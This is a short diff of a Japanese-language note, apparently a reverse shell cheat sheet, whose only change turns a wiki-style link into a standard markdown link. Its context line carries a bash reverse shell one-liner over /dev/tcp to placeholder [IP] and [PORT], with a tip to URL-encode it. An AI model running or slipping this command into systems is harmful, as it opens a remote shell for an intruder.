@@ -30,7 +30,7 @@ bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'
 ```
 
 ⚠️必要に応じてURLエンコードすること
-詳細は[[What is the shell]]
+詳細は[What is the shell](What%20is%20the%20shell.md)
 
 ---
 
